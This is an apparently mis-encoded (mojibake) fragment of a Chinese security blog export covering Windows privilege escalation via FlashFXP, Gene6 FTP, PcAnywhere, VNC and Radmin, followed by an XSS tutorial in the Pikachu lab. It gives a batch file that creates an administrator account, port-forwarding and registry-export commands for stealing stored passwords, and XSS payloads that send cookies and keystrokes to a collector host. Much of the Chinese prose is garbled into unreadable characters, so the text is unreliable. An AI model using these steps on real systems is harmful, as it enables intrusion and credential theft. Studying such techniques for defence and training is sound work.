NETç‰ˆæœ¬Shellä¸€ä¸ª 0x03 FlashFXP ææƒæ€ç»´å¯¼å›¾ææƒæ€è·¯ï¼šåˆ©ç”¨FlashFXPæ›¿æ¢æ–‡ä»¶æ¼æ´ï¼Œå¯ä»¥è¯»å–ç®¡ç†å‘˜é“¾æ¥è¿‡çš„ç«™ç‚¹è´¦å·å¯†ç ã€‚ æ€è·¯æ‰©å±•ï¼šé€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦çŒœæµ‹å…¶ä»–çš„å¯†ç åŒæ ·å¦‚æ­¤,å€Ÿæ­¤æœºä¼šæ‰©å¤§æƒé™ 0x04 æ“ä½œæ¼”ç¤º**1. **é¦–å…ˆè·å–WebShellï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¤§é©¬æˆ–èœåˆ€ï¼Œå°†quick.datä¸‹è½½ä¸‹æ¥ï¼ˆå› ä¸ºé“¾æ¥çš„è´¦å·å¯†ç éƒ½ä¿å­˜åœ¨quick.datè¿™ä¸ªæ–‡ä»¶ä¸­ï¼‰ æ³¨ï¼šfalshfxpé»˜è®¤å®‰è£…ç›®å½•ï¼šC:\\Program Files\\flashfxp **2. **æ¥ä¸‹æ¥æ‰“å¼€æˆ‘ä»¬æ‹¿åˆ°çš„webshell,ä¸‹è½½quick.datè¿™ä¸ªæ–‡ä»¶ï¼Œä¸‹è½½åï¼Œæ‰“å¼€æˆ‘ä»¬æœ¬æœºçš„FlashFTPæŠŠåŸå…ˆçš„æ–‡ä»¶ææ¢æ‰ï¼Œæ‰“å¼€æœ¬æœºè½¯ä»¶ï¼ŒæŸ¥çœ‹å†å²è®°å½•ï¼Œå¯ä»¥çœ‹åˆ°å—å®³è€…ä¸»æœºquick.dat æ–‡ä»¶é‡Œçš„æœåŠ¡å™¨ã€ç”¨æˆ·åã€å¯†ç ç­‰ä¿¡æ¯ï¼Œå¦‚æœæƒ³è¦è·å–å¯†ç ï¼Œå¯ä¸‹è½½æ˜Ÿå·å¯†ç æŸ¥çœ‹å·¥å…·æŸ¥çœ‹æš—æ–‡ã€‚ 1234567**æ˜Ÿå·å¯†ç æŸ¥çœ‹å·¥å…·åœ°å€ï¼š**[https:&#x2F;&#x2F;www.arpun.com&#x2F;soft&#x2F;8153.html](https:&#x2F;&#x2F;www.arpun.com&#x2F;soft&#x2F;8153.html)å‚è€ƒé“¾æ¥ï¼š [http:&#x2F;&#x2F;m.mamicode.com&#x2F;info-detail-1385885.html](http:&#x2F;&#x2F;m.mamicode.com&#x2F;info-detail-1385885.html) [https:&#x2F;&#x2F;www.docin.com&#x2F;p-434258776.html](https:&#x2F;&#x2F;www.docin.com&#x2F;p-434258776.html) Gene6 FTPææƒ Gene6 FTP Serverè¿™ä¸ªFTPè½¯ä»¶ç®€ç•¥æ˜“ç”¨,æ¯”SUçš„ä¿é™©æ€§é«˜çš„å¤š.ä»–çš„é»˜è®¤ç®¡ç†ç«¯å£æ˜¯8021,åªå®¹è®¸æœ¬æœºç›˜ç®—æœºè¿æ¥.å¤–éƒ¨è®¡ç®—æœºå³ä¾¿ä½ å¾—åˆ°ç®¡ç†å¸,ä½ ä¹Ÿä¸èƒ½ç™»é™†è¿›å».è¿™ä¸€ç‚¹å’Œæˆ‘ä»¬çš„SUä¸€æ ·,SUçš„ç®¡ç†ç«¯å£æ˜¯43958.Gene6 FTP Serverçš„å¸æˆ·é…ç½®æ–‡ä»¶åœ¨:C:\\Program Files\\Gene6 FTP Server\\RemoteAdmin\\Remote.ini;åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°md5åŠ å¯†çš„å¯†ç  é‚£ä¹ˆæˆ‘ä»¬åªèƒ½é€šè¿‡webshellä¸Šä¼ lcx.exe æŠŠç«¯å£è½¬å‘ï¼Œå¦‚ï¼šlcx.exe â€“tran 600 127.0.0.1 8021 æ¥é€šè¿‡å¦å¤–ä¸€å°æœºå™¨å®‰è£…ä¸€ä¸ªgene6è¿œç¨‹è¿æ¥600ç«¯å£åˆ›å»ºä¸€ä¸ªåŸŸå†åˆ›å»ºä¸€ä¸ªæœ‰æƒé™çš„å¸å·,æ³¨æ„Gene6å¯å•ç‹¬å®šä¹‰SITEå‘½ä»¤è°ƒç”¨æ‰§è¡Œæ–‡ä»¶æ–‡ä»¶å¯ä»¥é€šè¿‡webshellä¸Šä¼ ä¸Šä¼ ä¸ºè¿™æ ·è¿˜ä¸èƒ½ææƒ.è¿™é‡Œåˆ°äº†æˆ‘ä»¬æœ€æ ¸å¿ƒçš„ä¸€æ­¥.1.å†™ä¸€ä¸ªèƒ½æ‰§è¡Œå‘½ä»¤çš„æ‰¹å¤„ç†æ–‡ä»¶,å¹¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº.@echo offnet user hack hack /addnet localgroup administrators hack /add2.ç„¶ååœ¨SITE COMMANDSé‚£ä¸ªåœ°æ–¹å†è¿›è¡Œé…ç½®.COMMANDé‚£è¾“å…¥ä½ çš„å‘½ä»¤æ‰§è¡Œçš„åå­—.æˆ‘å†™çš„æ˜¯HACK DESCRIPTTIONè¿™ä¸ªæ˜¯å†™æè¿°çš„.è¿™é‡Œéšä¾¿ä½ å†™ä»€ä¹ˆéƒ½å¯ä»¥çš„.EXECUTEè¿™é‡Œè¾“å…¥ä½ çš„BATçš„å‘½ä»¤æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„.ä¹Ÿå°±æ˜¯ä½ åˆšä¸Šä¼ çš„é‚£ä¸ªæ–‡ä»¶çš„è·¯å¾„.ç‚¹OKå°±å¯ä»¥äº†.ç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸‹æˆ‘ä»¬æœ¬åœ°çš„å¸å·æƒ…å†µ.åªæœ‰ä¸¤ä¸ªå¸å·.ç°åœ¨æˆ‘ä»¬ç™»é™†FTPè¿›è¡Œææƒæ“ä½œ.è¾“å…¥ææƒå‘½ä»¤ . 1quote site hack 200 Command executed å‘½ä»¤æˆåŠŸæ‰§æˆ‘ä»¬æ¥çœ‹ä¸‹åŠ ä¸Šå¸å·æ²¡æœ‰.å·²ç»å¤šäº†ä¸€ä¸ªHACKçš„å¸å·,æƒé™ä¸ºç®¡ç†æƒé™.æå‡æƒé™å·²ç»æˆåŠŸ.ï¼Œé€šè¿‡quote site exec æ‰§è¡Œå°±è¡Œ PCanyWhereææƒPCAnyWhereç®€ä»‹PcAnyWhereæ˜¯ä¸€æ¬¾è¿œç¨‹æ§åˆ¶è½¯ä»¶ï¼Œå®ƒå‡ºç°çš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç½‘ç®¡äººå‘˜ç®¡ç†æœåŠ¡å™¨ã€‚å®‰è£…ä¹‹åé»˜è®¤ç›‘å¬5631ç«¯å£ã€‚å®ƒå¯ä»¥å°†ç”µè„‘å½“æˆä¸»æ§ç«¯å»æ§åˆ¶è¿œæ–¹çš„å¦å¤–ä¸€å°åŒæ ·å®‰è£…æœ‰PcAnyWhereçš„ç”µè„‘ï¼ˆè¢«æ§ç«¯ï¼‰ï¼Œå®ç°äº’ä¼ æ–‡ä»¶ï¼Œå†…å»ºFIPS 140-2éªŒè¯AES 256ä½å…ƒåŠ å¯†ï¼Œå¯ä»¥ç¡®ä¿é˜¶æ®µä½œä¸šçš„å®‰å…¨æ€§ã€‚ ææƒåŸç†PcAnyWhereææƒçš„åŸç†æ˜¯PcAnyWhereåœ¨å»ºç«‹è¢«æ§ç«¯åï¼Œä¼šåœ¨æœåŠ¡å™¨ä¸Šäº§ç”Ÿä¸€ä¸ªé…ç½®æ–‡ä»¶â€œpca.***.cifâ€ï¼Œè¿™ä¸ªæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å¹¶éåœ¨å®‰è£…ç›®å½•ä¸­ï¼Œè€Œæ˜¯åœ¨â€œC:\\Document and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\Hostsâ€ä¸­ã€‚ åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿å­˜ç€åŠ å¯†åçš„é“¾æ¥è´¦æˆ·ä¿¡æ¯ï¼Œå½“æ”»å‡»è€…ä¸‹è½½åˆ°è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œå°±å¯ä»¥å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè§£å¯†ï¼Œä¹‹åå³å¯è·å¾—ç”¨æˆ·åä¸å¯†ç ï¼Œä¹‹åå†ä½¿ç”¨æœ¬åœ°çš„PcAnyWhereè¿›è¡Œç™»å½•é“¾æ¥å³å¯è·å¾—è¿œç¨‹æ§åˆ¶ã€‚ ææƒæ“ä½œæ¼”ç¤ºç¯å¢ƒéƒ¨ç½²é¦–å…ˆä¸‹è½½PcAnyWhereåˆ°æœ¬åœ°ï¼Œä¹‹ååˆ†åˆ«åœ¨é¶æœºï¼ˆWindows Server 2003 R2ï¼‰ã€æ”»å‡»ä¸»æœºWindows XP ä¸­è¿›è¡Œå®‰è£…ï¼Œä¹‹åå†Windows Server 2003 R2ä¸­å»ºç«‹è¢«æ§åˆ¶ç«¯ç¨‹åºï¼Œè®¾ç½®ç”¨æˆ·åï¼šhps å¯†ç ï¼š*****,ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨â€œC:\\Document and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\Hostsâ€ä¸­ å­˜åœ¨ä¸€ä¸ªç”¨äºè®°å½•è¯¥ç”¨æˆ·çš„æ–‡ä»¶ï¼š æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„å°±æ˜¯é€šè¿‡åœ¨Windows Server 2003 R2ä¸Šçš„WEBshellæ¥ä¸‹è½½è¯¥æ–‡ä»¶åˆ°æ”»å‡»ä¸»æœºä¸Šï¼Œä¹‹åå†è¿›è¡Œç ´è§£ï¼Œæœ€åå†ä½¿ç”¨æ”»å‡»ä¸»æœºä¸Šçš„PcAnyWhereè¿›è¡Œè¿æ¥ï¼ä¸‹é¢è¿›è¡Œå…·ä½“æ“ä½œï¼ åœ¨Windows XPä¸­ä½¿ç”¨èœåˆ€è¿æ¥ä¸€å¥è¯æœ¨é©¬ ä¹‹åè¿›å…¥C:\\Document and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\Hosts\\ä¸‹ï¼Œä¸‹è½½æ–‡ä»¶ ä¹‹åå¯ä»¥ä½¿ç”¨æ˜å°å­ã€é€šå¤©é—¨æ¥å¯¹è¯¥æ–‡ä»¶è¿›è¡Œè§£å¯†ï¼Œè·å¾—æœ€åçš„ç”¨æˆ·åä¸å¯†ç ï¼Œä¹‹ååœ¨æœ¬åœ°åˆ›å»ºPcAnyWhereçš„æ§åˆ¶ç«¯è¿›è¡Œè¿æ¥å³å¯ï¼ å®ç°è¿œæ§ï¼Œææƒï¼ VNCææƒVNC(Virtual Network Computingï¼Œè™šæ‹Ÿç½‘ç»œè®¡ç®—ï¼‰æ˜¯ä¸€å¥—ç”±è‹±å›½å‰‘æ¡¥å¤§å­¦AT&amp;Tå®éªŒå®¤åœ¨2002å¹´å¼€å‘çš„è½»é‡å‹è·¨å¹³å°è¿œç¨‹æ§åˆ¶è®¡ç®—æœºè½¯ä»¶â€œvncçš„é»˜è®¤ç«¯å£æ˜¯5901ä½¿ç”¨ç«¯å£æ‰«æå¦‚æœæœ‰ä¾¿å®‰è£…äº†vnc æˆ‘ä»¬åœ¨å®éªŒæ—¶å®‰è£…æœåŠ¡ç«¯å°±å¯ æˆ‘ä»¬å¯ä»¥é€šè¿‡è„šæœ¬å¤§é©¬è¯»æ³¨å†Œè¡¨è·å–å¯†ç å¦‚æœä¸è¡Œåˆ©ç”¨èœåˆ€ä¸Šä¼ ä¸€ä¸ªcmd.exeåˆ°æœ‰è¯»å†™æƒé™çš„ç›®å½•ç„¶åsetp c:\\è·¯å¾„â€¦\\cmd.exe #åˆ‡æ¢è‡³ä¸Šä¼ çš„cmdæ¥æ‰§è¡Œå‘½ä»¤ 1Cmd&#x2F;c&quot;regedit&#x2F;ec:\\123.reg&quot;HKEY_LOCAL_MACHINE\\software\\RealVNC\\WinVNC4&quot; &quot; è·å–çš„å¯†ç å°†å¾—å‡ºçš„åè¿›åˆ¶æ•°å»æ‰ç¬¬ä¸€ä¸ªæ•°å…¶ä»–è½¬æ¢æˆ16è¿›åˆ¶ç ´è§£16è¿›åˆ¶æ•°å¾—åˆ°å¯†ç vncx.exe -W å›è½¦è¾“å…¥16è¿›åˆ¶æ•°è¿æ¥vncè¯»å– vncx4.exe -w 8ä¸ªæ•° è‡ªåŠ¨ç ´è§£å¯†ç  ç„¶åä½¿ç”¨æˆ‘ä»¬vncå·¥å…·è¿æ¥ Radminææƒä¸€æ¬¾è¿œæ§å·¥å…· ç«¯å£æ‰«æ 4899 ç«¯å£ ä¸Šä¼  radmin.asp æœ¨é©¬è¯»å– radminçš„åŠ å¯†å¯†æ–‡ ä¸‹è½½radminå·¥å…·è¿æ¥æˆ–è€…Radminå®‰è£…æ–¹æ³•ç›´æ¥æŠŠserver.exe å’Œadmdll.dllæ”¾åœ¨vmé‡Œé¢ï¼Œcmdä¸‹è¿è¡Œserver.exe /setup è®¾ç½®å¯†ç åŠè¾“å…¥æ³¨å†Œä¿¡æ¯å°±okäº†ï¼›å®‰è£…å®Œä¹‹åå¯ä»¥é€šè¿‡C:&gt;cmd /c â€œregedit /e c:\\123.reg â€œHKEY_LOCAL_MACHINE\\system\\RAdmin\\v2.0\\ServerParametersâ€â€å¯¼å‡ºhashå€¼ï¼Œå†é€šè¿‡hashç‰ˆRadminè¿æ¥å°±å¯ä»¥ 12cmd&#x2F;c&quot;regedit&#x2F;ed:\\IFEO.reg&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&quot;&quot; cmd&#x2F;c&quot;regedit&#x2F;ed:\\123.reg&quot;HKEY_LOCAL_MACHINE\\system\\RAdmin\\v2.0\\Server\\Parameters&quot;&quot;","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","slug":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","date":"2019-09-12T12:04:03.000Z","updated":"2020-09-20T08:51:11.513Z","comments":true,"path":"2019/09/12/XSSè·¨ç«™è„šæœ¬æ”»å‡»/","link":"","permalink":"https://zhangyanlady.github.io/2019/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/","excerpt":"","text":"xssæ€»ç»“å›¾ xssæ”»å‡»å›¾ ä¸€ã€ä»€ä¹ˆæ˜¯ XSSXSSå…¨ç§°ï¼ˆCross Site Scriptingï¼‰è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯æœ€å¸¸è§çš„Webåº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ä¹‹ä¸€ã€‚XSSæ˜¯æŒ‡æ”»å‡»è€…åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼Œé€šå¸¸æ˜¯JavaScriptç¼–å†™çš„å±é™©ä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨æµè§ˆå™¨æµè§ˆç½‘æ—¶ï¼Œè„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„ã€‚ äºŒã€XSSæ¼æ´å‡ºç°çš„åŸå› ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºçš„æ§åˆ¶ä¸å¤Ÿä¸¥æ ¼,å¯¼è‡´â€ç²¾å¿ƒæ„é€ â€œçš„è„šæœ¬è¾“å…¥å,åœ¨è¾“åˆ°å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³. ä¸‰ã€XSSçš„å±å®³1ã€é¦–å…ˆå¯¹äºé‚£äº›åŠå¹´æ²¡æœ‰æ›´æ–°çš„å°ä¼ä¸šç½‘ç«™æ¥è¯´ï¼Œå‘ç”ŸXSSæ¼æ´å‡ ä¹æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ä¸€èˆ¬åœ¨å„ç±»çš„ç¤¾äº¤å¹³å°ï¼Œé‚®ä»¶ç³»ç»Ÿï¼Œå¼€æºæµè¡Œçš„Webåº”ç”¨ï¼ŒBBSï¼Œå¾®åšç­‰åœºæ™¯ä¸­ï¼Œé€ æˆçš„æ€ä¼¤åŠ›å´ååˆ†å¼ºå¤§ã€‚2ã€åŠ«æŒç”¨æˆ·cookieæ˜¯æœ€å¸¸è§çš„è·¨ç«™æ”»å‡»å½¢å¼ï¼Œé€šè¿‡åœ¨ç½‘é¡µä¸­å†™å…¥å¹¶æ‰§è¡Œè„šæœ¬æ‰§è¡Œæ–‡ä»¶ï¼ˆå¤šæ•°æƒ…å†µä¸‹æ˜¯JavaScriptè„šæœ¬ä»£ç ï¼‰ï¼ŒåŠ«æŒç”¨æˆ·æµè§ˆå™¨ï¼Œå°†ç”¨æˆ·å½“å‰ä½¿ç”¨çš„sessionIDä¿¡æ¯å‘é€è‡³æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™æˆ–æœåŠ¡å™¨ä¸­ã€‚3ã€â€œæ¡†æ¶é’“é±¼â€ã€‚åˆ©ç”¨JSè„šæœ¬çš„åŸºæœ¬åŠŸèƒ½ä¹‹ä¸€ï¼šæ“ä½œç½‘é¡µä¸­çš„DOMæ ‘ç»“æ„å’Œå†…å®¹ï¼Œåœ¨ç½‘é¡µä¸­é€šè¿‡JSè„šæœ¬ï¼Œç”Ÿæˆè™šå‡çš„é¡µé¢ï¼Œæ¬ºéª—ç”¨æˆ·æ‰§è¡Œæ“ä½œï¼Œè€Œç”¨æˆ·æ‰€æœ‰çš„è¾“å…¥å†…å®¹éƒ½ä¼šè¢«å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šã€‚4ã€æŒ‚é©¬ï¼ˆæ°´å‘æ”»å‡»ï¼‰5ã€æœ‰å±€é™æ€§çš„é”®ç›˜è®°å½• å››ã€ XSSåˆ†ç±»1ã€åå°„å‹XSSæˆ–ä¸æŒä¹…å‹XSS(ä¸­å±)äº¤äº’çš„æ•°æ®ä¸€èˆ¬ä¸ä¼šè¢«å­˜åœ¨åœ¨æ•°æ®åº“é‡Œé¢,åªæ˜¯ç®€å•çš„æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®åå°„ç»™æµè§ˆå™¨ï¼Œä¸€æ¬¡æ€§ï¼Œæ‰€è§å³æ‰€å¾—ã€‚ 12345678910111213payload&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;&#x2F;sCrIpT&gt;&lt;?php_GET[&#39;name&#39;];echo &quot;Welcome $name&quot;;?&gt; 2ã€å‚¨å­˜å‹XSS æˆ–æŒä¹…å‹ XSSï¼ˆé«˜å±ï¼‰äº¤äº’çš„æ•°æ®ä¼šè¢«å­˜åœ¨åœ¨æ•°æ®åº“é‡Œé¢,æ°¸ä¹…æ€§å­˜å‚¨,å…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ 3ã€DOM XSSä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’,é€šè¿‡å‰ç«¯çš„domèŠ‚ç‚¹å½¢æˆçš„XSSæ¼æ´ã€‚ä»€ä¹ˆæ˜¯DOM:DOMå…¨ç§°æ˜¯Document Object Modelï¼Œä¹Ÿå°±æ˜¯æ–‡æ¡£å¯¹è±¡æ¨¡å‹ã€‚æˆ‘ä»¬å¯ä»¥å°†DOMç†è§£ä¸ºï¼Œä¸€ä¸ªä¸ç³»ç»Ÿå¹³å°å’Œç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œç¨‹åºå’Œè„šæœ¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£åŠ¨æ€åœ°è®¿é—®å’Œä¿®æ”¹æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚å½“åˆ›å»ºå¥½ä¸€ä¸ªé¡µé¢å¹¶åŠ è½½åˆ°æµè§ˆå™¨æ—¶ï¼ŒDOMå°±æ‚„ç„¶è€Œç”Ÿï¼Œå®ƒä¼šæŠŠç½‘é¡µæ–‡æ¡£è½¬æ¢ä¸ºä¸€ä¸ªæ–‡æ¡£å¯¹è±¡ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å¤„ç†ç½‘é¡µå†…å®¹ã€‚æ•…å¯ä»¥ä½¿ç”¨ Javascript è¯­è¨€æ¥æ“ä½œDOMä»¥è¾¾åˆ°ç½‘é¡µçš„ç›®çš„ã€‚https://www.w3school.com.cn/htmldom/index.asp&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;&lt;a href=&#39;#&#39; onclick=&quot;alert(2222)&quot;&gt;what do you see?&lt;/a&gt; äº”ã€XSSå¯èƒ½å­˜åœ¨çš„åœ°æ–¹HTML contextAttribute ContextURL ContextStyle ContextScript Context å…­ã€XSSæµ‹è¯•æ–¹æ³•1ã€å·¥å…·æ‰«æï¼šAPPscanã€AWVS2ã€æ‰‹å·¥æµ‹è¯•ï¼šBurpsuiteã€firefox(hackbar)ã€XSSER XSSFä½¿ç”¨æ‰‹å·¥æ£€æµ‹Webåº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨XSSæ¼æ´æ—¶ï¼Œæœ€é‡è¦çš„æ˜¯è€ƒè™‘é‚£é‡Œæœ‰è¾“å…¥ï¼Œè¾“å…¥çš„æ•°æ®åœ¨ä»€ä¹ˆåœ°æ–¹è¾“å‡ºã€‚åœ¨è¿›è¡Œæ‰‹å·¥æ£€æµ‹XSSæ—¶ï¼Œäººæ¯•ç«Ÿä¸åƒè½¯ä»¶é‚£æ ·ä¸çŸ¥ç–²æƒ«ï¼Œæ‰€ä»¥ä¸€å®šè¦é€‰æ‹©æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦ï¼Œè¿™æ ·å¯ä»¥å¿«é€Ÿæµ‹è¯•æ˜¯å¦å­˜åœ¨XSSã€‚ï¼ˆ1ï¼‰åœ¨ç›®æ ‡ç«™ç‚¹ä¸Šæ‰¾åˆ°è¾“å…¥ç‚¹,æ¯”å¦‚æŸ¥è¯¢æ¥å£,ç•™è¨€æ¿ç­‰;ï¼ˆ2ï¼‰è¾“å…¥ä¸€ç»„â€ç‰¹æ®Šå­—ç¬¦+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€,ç‚¹å‡»æäº¤å,æŸ¥çœ‹è¿”å›çš„æºç ,æ˜¯å¦æœ‰åšå¯¹åº”çš„å¤„ç†;ï¼ˆ3ï¼‰é€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€å­—ç¬¦,ç»“åˆå”¯ä¸€å­—ç¬¦å‰åè¯­æ³•ç¡®è®¤æ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡Œjsçš„æ¡ä»¶(æ„é€ é—­åˆ);æäº¤æ„é€ çš„è„šæœ¬ä»£ç ,çœ‹æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œ,å¦‚æœæˆåŠŸæ‰§è¡Œåˆ™è¯´æ˜å­˜åœ¨XSSæ¼æ´; ä¸ƒã€å®æˆ˜1ã€xsså¹³å°æ­å»ºåŠåå°ä½¿ç”¨ï¼ˆcookieè·å–ï¼‰&#39;&quot;&gt;&lt;script&gt;document.location = &#39;http://192.168.0.113/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt; //é€šè¿‡document.location å®ä¾‹è¿›è¡Œé‡å®šå‘åˆ°http://127.0.0.1/pikachu/index.phpphpç‰ˆæœ¬å½±å“å®éªŒç»“æœ 2ã€åå°„å‹XSS(POST)è·å–ç”¨æˆ·å¯†ç postæ”»å‡»åˆ©ç”¨é¡µé¢ D:\\phpStudy\\WWW\\pikachu\\pkxss\\xcookie\\post.htmlhttp://192.168.0.113:80/post.html 3ã€xssé’“é±¼æ¼”ç¤ºé’“é±¼æ”»å‡»åˆ©ç”¨é¡µé¢ E:\\phpStudy\\WWW\\pikachu\\pkxss\\xfish 4ã€xssè·å–é”®ç›˜è®°å½•æ¼”ç¤º (1)ã€ä»€ä¹ˆæ˜¯è·¨åŸŸ â€‹ http:// www. oldboyedu.com :80 / news/index.php åè®® å­åŸŸå ä¸»åŸŸå ç«¯å£èµ„æºåœ°å€ â€‹ å½“åè®®ã€ä¸»æœº(ä¸»åŸŸåï¼Œå­åŸŸå)ã€ç«¯å£ä¸­çš„ä»»æ„ä¸€ä¸ªä¸ç›¸åŒæ—¶ï¼Œç§°ä¸ºä¸åŒåŸŸã€‚æˆ‘ä»¬æŠŠä¸åŒçš„åŸŸä¹‹é—´è¯·æ±‚æ•°æ®çš„æ“ä½œï¼Œæˆä¸ºè·¨åŸŸæ“ä½œã€‚ (2)ã€åŒæºç­–ç•¥ â€‹ ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½çº¦å®šäº†â€œåŒæºç­–ç•¥â€ï¼ŒåŒæºç­–ç•¥ç¦æ­¢é¡µé¢åŠ è½½æˆ–æ‰§è¡Œä¸è‡ªèº«æ¥æºä¸åŒçš„åŸŸçš„ä»»ä½•è„šæœ¬æ—¢ä¸åŒåŸŸä¹‹é—´ä¸èƒ½ä½¿ç”¨JSè¿›è¡Œæ“ä½œã€‚æ¯”å¦‚ï¼šx.comåŸŸåä¸‹çš„jsä¸èƒ½æ“ä½œy.comåŸŸåä¸‹çš„å¯¹è±¡ â€‹ é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰åŒæºç­–ç•¥ï¼Ÿ æ¯”å¦‚ä¸€ä¸ªæ¶æ„ç½‘ç«™çš„é¡µé¢é€šè¿‡jsåµŒå…¥äº†é“¶è¡Œçš„ç™»å½•é¡µé¢ï¼ˆäºŒè€…ä¸åŒæºï¼‰ï¼Œå¦‚æœæ²¡æœ‰åŒæºé™åˆ¶ï¼Œæ¶æ„ç½‘é¡µä¸Šçš„javascriptè„šæœ¬å°±å¯ä»¥åœ¨ç”¨æˆ·ç™»å½•é“¶è¡Œçš„æ—¶å€™è·å–ç”¨æˆ·åå’Œå¯†ç ã€‚ Tips:ä¸‹é¢è¿™äº›æ ‡ç­¾è·¨åŸŸåŠ è½½èµ„æº(èµ„æºç±»å‹æ˜¯æœ‰é™æ­¢çš„)æ˜¯ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ &lt;script src=&quot;...&quot;&gt; //åŠ è½½æœ¬åœ°jsæ‰§è¡Œ &lt;img src=&quot;C:/blog/source/_posts/...&quot;&gt; //å›¾ç‰‡ &lt;link href=&quot;...&quot;&gt; //css &lt;iframe src=&quot;...&quot;&gt; //ä»»æ„èµ„æº (3)ã€åŒæºç­–ç•¥ä¿®æ”¹ â€‹ E:\\phpStudy\\WWW\\pikachu\\pkxss\\rkeypress\\rkserver.php â€‹ åŒä¹‹å‰çš„æ¡ˆä¾‹åˆ°åå°è®¾ç½®å¥½Access-Control-Allow-Originï¼Œè®¾ç½®ä¸º*ï¼Œæ—¢å…è®¸æ‰€æœ‰äººè®¿é—®ã€‚ (4ï¼‰rk.jså…³é”®ä»£ç è§£è¯» â€‹ var realkey = String.fromCharCode(event.keyCode); //è·å–ç”¨æˆ·é”®ç›˜è®°å½•ï¼Œæœ€åè½¬åŒ–ä¸ºå­—ç¬¦ä¸² â€‹ xl+=realkey; //èµ‹å€¼ç»™x1 â€‹ show(); //è°ƒç”¨showå‡½æ•°ï¼Œé€šè¿‡ä¸‹é¢ajaxè¿›è¡Œpostå‘é€é”®ç›˜è®°å½•äººå†…å®¹ è¾“å…¥è®¾ç½®å¥½çš„æ¶æ„JSä»£ç ï¼š &lt;script src=&quot;http://192.168.3.60/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt; ç„¶ååœ¨é”®ç›˜ä¸Šéšæ„è¾“å…¥ï¼Œå°±å¯ä»¥åˆ°xsså¹³å°ä¸Šå»æŸ¥çœ‹é”®ç›˜è¾“å…¥çš„ç»“æœ å…«ã€xsså¦‚ä½•ç»•è¿‡åŠå®‰å…¨é˜²èŒƒå¤šæ•°ç½‘ç«™ä¸ºäº†é¿å…xssçš„æ”»å‡»ï¼Œå¯¹äºæ”»å‡»è€…çš„è¾“å…¥éƒ½é‡‡å–äº†è¿‡æ»¤çš„æªæ–½ï¼Œå¯¼è‡´æ”»å‡»è€…é€šå¸¸ä¸èƒ½æ­£å¸¸æ’å…¥æ¶æ„ä»£ç 